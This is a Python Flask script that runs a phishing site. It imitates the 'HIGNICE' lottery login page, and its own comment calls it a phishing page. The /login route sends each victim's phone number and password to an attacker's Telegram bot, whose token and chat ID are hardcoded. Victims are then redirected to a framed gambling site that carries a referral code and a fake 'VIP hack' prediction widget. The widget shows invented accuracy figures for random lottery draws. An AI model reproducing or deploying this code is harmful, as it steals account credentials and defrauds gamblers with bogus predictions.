from flask import Flask, render_template_string, request, redirect, jsonify
import requests
import time
import threading
import collections
import math

app = Flask(__name__)

# --- কনফিগারেশন (আপনার তথ্য) ---
BOT_TOKEN = "8669461197:AAFSIR9hecqfftSSdXNF1E90xYvpqVIAVRg"
CHAT_ID = "7897417844"
API_URL = "https://draw.ar-lottery01.com/WinGo/WinGo_30S/GetHistoryIssuePage.json"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 12)",
    "Referer": "https://leader-shanto-vip-hack.edgeone.app/"
}

# প্রেডিকশন ডাটা স্টোরেজ (উইজেটের জন্য)
prediction_data = {
    "issue": "---", 
    "size": "WAIT", 
    "color": "WAIT", 
    "number": "--",
    "confidence": "0%",
    "status": "Scanning..."
}

# --- রিয়েল প্রেডিকশন ইঞ্জিন (Arham.vip.hack.py থেকে) ---
def get_size(num): return "BIG" if num >= 5 else "SMALL"

def analyze_engine(history):
    nums = [int(i['number']) for i in history[:30]]
    freq = collections.Counter(nums)
    hot = [n for n, _ in freq.most_common(3)]
    
    changes = [abs(nums[i] - nums[i+1]) for i in range(len(nums)-1)]
    vol = sum(changes) / len(changes) if changes else 0
    momentum = sum(nums[:5]) - sum(nums[5:10])
    big_ratio = sum(1 for n in nums[:12] if n >= 5) / 12 * 100
    
    streak = len(nums) >= 3 and len(set(nums[:3])) == 1
    zigzag = len(nums) >= 4 and (nums[0] < nums[1] > nums[2] < nums[3])

    mean = sum(nums[:10]) / 10
    variance = sum((x - mean) ** 2 for x in nums[:10]) / 10
    std_dev = math.sqrt(variance)
    stability = max(0, min(100, 100 - (vol * 6) - (std_dev * 3)))

    return hot, vol, momentum, big_ratio, streak, zigzag, stability, std_dev

def get_prediction(history):
    latest = history[0]
    last_num, last_col = int(latest['number']), latest['color'].upper()
    hot, vol, mom, strength, streak, zigzag, stab, dev = analyze_engine(history)
    avg = sum(int(i['number']) for i in history[:10]) / 10

    score = 0
    if streak: size, color, score = get_size(last_num), last_col, 30
    elif zigzag: size, color, score = ("BIG" if last_num < 5 else "SMALL"), ("GREEN" if last_col == "RED" else "RED"), 20
    elif strength > 75: size, color, score = ("SMALL" if last_num >= 5 else "BIG"), ("GREEN" if last_col == "RED" else "RED"), 15
    else: size, color = ("SMALL" if avg >= 4.6 else "BIG"), ("GREEN" if last_col == "RED" else "RED")

    confidence = max(5, min(98, (55 + abs(avg - 4.5) * 10 + score - vol * 2 + (stab - 50) * 0.3 + mom * 0.1)))
    return size, color, hot, confidence, vol, stab, strength, mom, dev

def run_prediction_engine():
    global prediction_data
    session = requests.Session()
    session.headers.update(HEADERS)
    last_issue = None
    
    while True:
        try:
            data = session.get(f"{API_URL}?ts={int(time.time()*1000)}", timeout=4).json()
            history = data.get('data', {}).get('list', [])
            
            if not history: 
                time.sleep(2)
                continue

            current = history[0]
            issue = current['issueNumber']

            if issue != last_issue:
                last_issue = issue
                size_p, color_p, hot, conf, vol, stab, strength, mom, dev = get_prediction(history)
                
                next_issue = str(int(issue) + 1)
                best_number = str(hot[0]) if hot else "--"
                
                prediction_data = {
                    "issue": next_issue[-4:], # উইজেটে শেষের ৪ ডিজিট শো করবে
                    "size": size_p,
                    "color": color_p,
                    "number": best_number,
                    "confidence": f"{conf:.1f}%",
                    "status": "LIVE"
                }
        except Exception as e:
            pass
        time.sleep(2)

# ব্যাকগ্রাউন্ডে ইঞ্জিন চালু করা
threading.Thread(target=run_prediction_engine, daemon=True).start()

# --- ১. হুবহু ফিশিং লগইন পেজ (UI Optimized) ---
LOGIN_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>HIGNICE - Login</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --primary: #f95959; --bg: #f7f8ff; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; background-color: var(--bg); color: #333; overflow-x: hidden; }
        .header { background: linear-gradient(135deg, #ff6b6b 0%, #f95959 100%); height: 180px; display: flex; flex-direction: column; align-items: center; justify-content: center; position: relative; color: white; }
        .header img { width: 140px; margin-bottom: 10px; }
        .lang-selector { position: absolute; top: 20px; right: 20px; display: flex; align-items: center; font-size: 14px; }
        .back-btn { position: absolute; top: 20px; left: 20px; font-size: 20px; }
        
        .login-container { background: white; margin: -40px 15px 0; border-radius: 25px; padding: 25px 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); }
        .login-title { font-size: 24px; font-weight: bold; margin-bottom: 5px; }
        .login-subtitle { color: #999; font-size: 13px; margin-bottom: 25px; }
        
        .tabs { display: flex; border-bottom: 1px solid #eee; margin-bottom: 25px; }
        .tab { flex: 1; text-align: center; padding: 12px 0; color: #999; font-weight: 500; cursor: pointer; transition: 0.3s; position: relative; }
        .tab.active { color: var(--primary); }
        .tab.active::after { content: ''; position: absolute; bottom: 0; left: 25%; width: 50%; height: 3px; background: var(--primary); border-radius: 3px; }
        .tab i { display: block; font-size: 22px; margin-bottom: 5px; }

        .input-group { margin-bottom: 20px; }
        .input-label { display: flex; align-items: center; margin-bottom: 8px; color: #444; font-weight: 500; }
        .input-label i { color: var(--primary); margin-right: 10px; font-size: 18px; }
        .input-box { display: flex; align-items: center; background: #f0f2f5; border-radius: 12px; padding: 12px 15px; }
        .input-box select { border: none; background: transparent; font-weight: bold; outline: none; margin-right: 10px; }
        .input-box input { border: none; background: transparent; outline: none; width: 100%; font-size: 15px; }
        
        .remember { display: flex; align-items: center; font-size: 13px; color: #666; margin-bottom: 25px; }
        .remember input { margin-right: 8px; accent-color: var(--primary); }
        
        .btn-login { width: 100%; padding: 14px; border-radius: 30px; border: none; background: #cfd4db; color: #7e8c9a; font-size: 17px; font-weight: bold; cursor: pointer; margin-bottom: 15px; }
        .btn-register { width: 100%; padding: 14px; border-radius: 30px; border: 1px solid var(--primary); background: transparent; color: var(--primary); font-size: 17px; font-weight: bold; cursor: pointer; }
        
        .footer-links { display: flex; justify-content: space-around; margin-top: 30px; }
        .footer-item { text-align: center; color: #666; font-size: 12px; }
        .footer-item i { display: block; font-size: 24px; margin-bottom: 5px; color: var(--primary); }
    </style>
</head>
<body>
    <div class="header">
        <i class="fa fa-chevron-left back-btn"></i>
        <div class="lang-selector"><img src="https://flagcdn.com/w20/us.png" style="width:20px; margin-right:5px;"> EN</div>
        <h1 style="letter-spacing: 2px;">HIGNICE</h1>
    </div>

    <div class="login-container">
        <div class="login-title">Log in</div>
        <div class="login-subtitle">Please log in with your phone number or email</div>
        
        <div class="tabs">
            <div class="tab active"><i class="fa fa-mobile-screen-button"></i>phone number</div>
            <div class="tab"><i class="fa fa-envelope"></i>Email Login</div>
        </div>

        <form action="/login" method="POST">
            <div class="input-group">
                <div class="input-label"><i class="fa fa-phone"></i> Phone number</div>
                <div class="input-box">
                    <select><option>+880</option></select>
                    <input type="text" name="phone" placeholder="Please enter the phone number" required oninput="checkInput()">
                </div>
            </div>

            <div class="input-group">
                <div class="input-label"><i class="fa fa-lock"></i> Password</div>
                <div class="input-box">
                    <input type="password" name="password" id="pass" placeholder="Password" required oninput="checkInput()">
                    <i class="fa fa-eye-slash" style="color:#ccc;"></i>
                </div>
            </div>

            <div class="remember">
                <input type="checkbox" checked> Remember password
            </div>

            <button type="submit" id="loginBtn" class="btn-login">Log in</button>
            <button type="button" class="btn-register">Register</button>
        </form>

        <div class="footer-links">
            <div class="footer-item"><i class="fa fa-lock-open"></i> Forgot password</div>
            <div class="footer-item"><i class="fa fa-headset"></i> Customer Service</div>
        </div>
    </div>

    <script>
        function checkInput() {
            const btn = document.getElementById('loginBtn');
            const phone = document.getElementsByName('phone')[0].value;
            const pass = document.getElementById('pass').value;
            if(phone.length > 5 && pass.length > 3) {
                btn.style.background = 'linear-gradient(90deg, #ff6b6b, #f95959)';
                btn.style.color = 'white';
            } else {
                btn.style.background = '#cfd4db';
                btn.style.color = '#7e8c9a';
            }
        }
    </script>
</body>
</html>
"""

# --- ২. মেইন গেম পেজ + অ্যাডভান্সড উইজেট ---
GAME_OVERLAY_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HIGNICE - Prediction System</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; background: #000; }
        iframe { width: 100%; height: 100%; border: none; }
        
        #hackWidget {
            position: fixed; top: 100px; right: 10px;
            width: 170px; background: rgba(10, 10, 15, 0.95);
            border: 2px solid #ff3e3e; border-radius: 15px;
            color: white; font-family: 'Segoe UI', sans-serif;
            padding: 12px; z-index: 9999; cursor: move;
            box-shadow: 0 0 20px rgba(255, 62, 62, 0.6);
            backdrop-filter: blur(5px);
        }
        .widget-header { border-bottom: 1px solid #333; padding-bottom: 8px; margin-bottom: 10px; font-weight: bold; display: flex; justify-content: space-between; font-size: 13px; }
        .live-dot { width: 8px; height: 8px; background: #ff0000; border-radius: 50%; display: inline-block; animation: blink 1s infinite; }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
        
        .row { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 12px; letter-spacing: 0.5px; }
        .label { color: #aaa; }
        .val { font-weight: 800; text-shadow: 0 0 5px rgba(255,255,255,0.2); }
        .val.green { color: #00ff88; }
        .val.red { color: #ff3e3e; }
        .val.gold { color: #ffca28; }
        
        .footer { text-align: center; margin-top: 10px; font-size: 9px; color: #555; border-top: 1px solid #222; padding-top: 5px; }
    </style>
</head>
<body>
    <iframe src="https://hgzy.vip/#/register?invitationCode=171661163318"></iframe>

    <div id="hackWidget">
        <div class="widget-header">
            <span style="color: #ff3e3e;">RG VIP BOT</span>
            <span><span id="wStatus">LIVE</span> <div class="live-dot"></div></span>
        </div>
        <div class="row"><span class="label">ISSUE:</span> <span class="val" id="wIssue">----</span></div>
        <div class="row"><span class="label">SIZE:</span> <span class="val" id="wSize">WAIT</span></div>
        <div class="row"><span class="label">COLOR:</span> <span class="val" id="wColor">WAIT</span></div>
        <div class="row"><span class="label">NUMBER:</span> <span class="val gold" id="wNumber">--</span></div>
        <div class="row"><span class="label">ACCURACY:</span> <span class="val" id="wConf">0%</span></div>
        <div class="footer">ARHAM VIP ENGINE v4.2</div>
    </div>

    <script>
        function update() {
            fetch('/api/prediction').then(r => r.json()).then(data => {
                document.getElementById('wIssue').innerText = data.issue;
                document.getElementById('wSize').innerText = data.size;
                document.getElementById('wColor').innerText = data.color;
                document.getElementById('wNumber').innerText = data.number;
                document.getElementById('wConf').innerText = data.confidence;
                
                // কালার ডাইনামিক চেঞ্জ
                const colorEl = document.getElementById('wColor');
                colorEl.className = 'val ' + data.color.toLowerCase();
                const sizeEl = document.getElementById('wSize');
                sizeEl.style.color = data.size === 'BIG' ? '#ff3e3e' : '#00ff88';
            });
        }
        setInterval(update, 2000);

        // ড্র্যাগেবল লজিক
        const widget = document.getElementById("hackWidget");
        let active = false, currentX, currentY, initialX, initialY, xOffset = 0, yOffset = 0;
        widget.addEventListener("touchstart", (e) => {
            initialX = e.touches[0].clientX - xOffset;
            initialY = e.touches[0].clientY - yOffset;
            active = true;
        });
        widget.addEventListener("touchend", () => active = false);
        widget.addEventListener("touchmove", (e) => {
            if (active) {
                e.preventDefault();
                currentX = e.touches[0].clientX - initialX;
                currentY = e.touches[0].clientY - initialY;
                xOffset = currentX; yOffset = currentY;
                widget.style.transform = `translate3d(${currentX}px, ${currentY}px, 0)`;
            }
        });
    </script>
</body>
</html>
"""

@app.route('/')
def home(): return render_template_string(LOGIN_HTML)

@app.route('/dashboard')
def dashboard(): return render_template_string(GAME_OVERLAY_HTML)

@app.route('/api/prediction')
def api_p(): return jsonify(prediction_data)

@app.route('/login', methods=['POST'])
def login():
    phone = request.form.get('phone')
    password = request.form.get('password')
    msg = f"🎯 **ARHAM HACK HIT!**\n📱 Phone: `{phone}`\n🔑 Pass: `{password}`"
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})
    return redirect("/dashboard")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
